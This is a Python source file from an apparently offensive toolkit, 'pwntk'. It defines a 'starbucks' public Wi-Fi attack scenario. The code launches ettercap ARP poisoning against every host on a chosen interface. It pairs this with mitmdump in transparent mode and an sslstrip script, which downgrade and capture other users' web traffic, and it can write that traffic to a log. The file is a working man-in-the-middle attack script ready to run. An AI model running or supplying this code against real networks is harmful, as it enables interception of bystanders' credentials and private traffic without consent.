import atexit
import os
from pwntk.base_scenario import BaseScenario
from pwntk.scenarios.starbucks.setup import ensure_scripts_folder, download_scripts, ensure_etter_conf
from pwntk.utils.io import timestamp_file, execute_cmd, kill_processes
from pwntk.utils.net import ensure_port_fwd
from pwntk.vars import vars

__all__ = ["StarbucksScenario"]

processes = []


class StarbucksScenario(BaseScenario):
    name = "starbucks"
    programs = ["mitmdump", "ettercap", "sysctl"]
    files = [f"{vars.get('pwntk_home')}/mitmproxy/scripts/sslstrip.py"]
    # mode: int = 2
    path: str = None
    interface: str = None
    ignored_domains = ["facebook", "google", "gmail", "apple"]

    def build_ignored_regex(self) -> str:
        d = "\.com|".join(self.ignored_domains)
        return f"^(.+\.)?({d}):443$"

    def setup(self):
        ensure_scripts_folder()
        download_scripts()
        ensure_port_fwd()
        ensure_etter_conf()

    def run(self):
        ignored_domains_regex = self.build_ignored_regex()
        mitm_cmd = f"{self.programs[0]} -s {self.files[0]} --mode transparent --ignore-hosts {ignored_domains_regex}"
        if self.path is not None:
            path_to_file = os.path.join(self.path, timestamp_file("mitmdump.log"))
            mitm_cmd += f" -w {path_to_file}"

        etter_cmd = f"ettercap -Tq -M arp:remote -i {self.interface} -S ////"

        # Execute and save in process list
        mitmdump = execute_cmd(mitm_cmd)
        etter = execute_cmd(etter_cmd)
        processes.append(mitmdump)
        processes.append(etter)

    def validate_options(self, parser):
        # parser.add_argument("-m", "--mode", action="store", default=2,
        #                    help="Violence level of attack (1,2,3). The default is 2")
        parser.add_argument("-p", "--path", action="store",
                            help="Path of output")
        parser.add_argument("-i", "--interface", action="store", required=True,
                            help="Virtual interface (most of the times: wlan0 - wireless, eth0 - ehternet)")

        args, _ = parser.parse_known_args()
        # self.mode = args.mode
        self.path = args.path
        self.interface = args.interface


def clean_up():
    kill_processes(processes)


atexit.register(clean_up)
